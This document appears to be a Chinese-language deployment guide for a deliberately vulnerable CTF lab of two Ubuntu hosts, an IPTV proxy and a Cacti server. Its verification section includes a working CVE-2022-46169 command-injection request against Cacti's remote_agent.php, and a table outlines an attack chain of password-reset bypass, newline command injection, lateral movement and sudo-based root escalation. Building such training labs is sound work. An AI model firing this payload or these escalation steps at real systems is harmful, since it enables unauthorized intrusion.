# 场景B 一键部署指南

## 部署方式

### 方式一：Git Clone（推荐）

**1. 将项目推送到 GitHub/Gitee**

```bash
# 在物理机上（Windows）
cd E:\vibecoding\gdj_ctf
git init
git add -A
git commit -m "Scenario B CTF"
git remote add origin https://github.com/YOURNAME/gdj-ctf.git
git push -u origin main
```

**2. 在目标 Ubuntu 上一键部署**

```bash
# 部署 B1 (DMZ - IPTV代理)
git clone https://github.com/YOURNAME/gdj-ctf.git
cd gdj-ctf
sudo bash deploy/ubuntu/deploy_b1.sh

# 部署 B2 (Internal - Cacti)
sudo bash deploy/ubuntu/deploy_b2.sh
```

### 方式二：单脚本部署

如果只需要 B2（Cacti 无需源码依赖），直接下载单个脚本：

```bash
# B2 单脚本部署（Cacti 从 Ubuntu 官方仓库安装）
curl -sSfL https://raw.githubusercontent.com/YOURNAME/gdj-ctf/main/deploy/ubuntu/deploy_b2.sh | sudo bash
```

### 方式三：HTTP 简易服务器

物理机开 HTTP 服务，目标 Ubuntu 下载：

```bash
# 物理机 (Windows PowerShell)
cd E:\vibecoding\gdj_ctf
python -m http.server 8888

# 目标 Ubuntu (需与物理机网络互通)
wget -r -np -nH --reject "index.html*" http://物理机IP:8888/
cd gdj-ctf
sudo bash deploy/ubuntu/deploy_b1.sh
```

## 系统要求

| 项目 | 要求 |
|------|------|
| B1 OS | Ubuntu 22.04 (Jammy) |
| B2 OS | Ubuntu 22.04 (Jammy) |
| CPU | 2 核+ |
| 内存 | 2 GB+ |
| 磁盘 | 20 GB+ |
| 网络 | 可连接互联网 (apt/pecl/composer) |

## 部署后验证

### B1 验证

```bash
curl -sI http://localhost/                    # 200 OK → IPTV首页
curl -s 'http://localhost/reset-password'      # 密码重置页面
mysql -u iptvadmin -p'Iptv@Proxy#2024' iptv_proxy -e "SELECT username FROM admins;"
```

### B2 验证

```bash
curl -sI http://localhost/                    # 302 → /cacti/
curl -s http://localhost/cacti/ | head -20    # Cacti登录页
# CVE 验证
curl -X POST 'http://localhost/cacti/remote_agent.php' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -d 'action=polldata&poller_id=;whoami>/dev/shm/test&host_id=1&local_data_ids[]=1'
cat /dev/shm/test                              # www-data
sudo -u www-data sudo -l                       # (root) NOPASSWD: /usr/bin/find
```

## 攻击链速查

| 步骤 | 目标 | 得分 | 方式 |
|------|------|------|------|
| B-1 | B1 | 100 | 密码重置绕过（响应篡改 false→true） |
| B-2 | B1 | 200 | 命令注入 %0a 换行绕过 |
| B-3 | B1 | 100 | MySQL 数据库 `iptv_proxy.admins` |
| B-4 | B1→B2 | 500 | 横向移动，发现 Cacti |
| B-5 | B2 | 500 | CVE-2022-46169 预认证 RCE |
| B-6 | B2 | 100 | MariaDB 数据库 `cacti.user_auth` |
| B-7 | B1 | 500 | sudo tee → root |
| B-8 | B2 | 500 | sudo find → root |
| **合计** | | **2500** | |

详细复现步骤见 `docs/B-FULL-ATTACK-MANUAL.md`
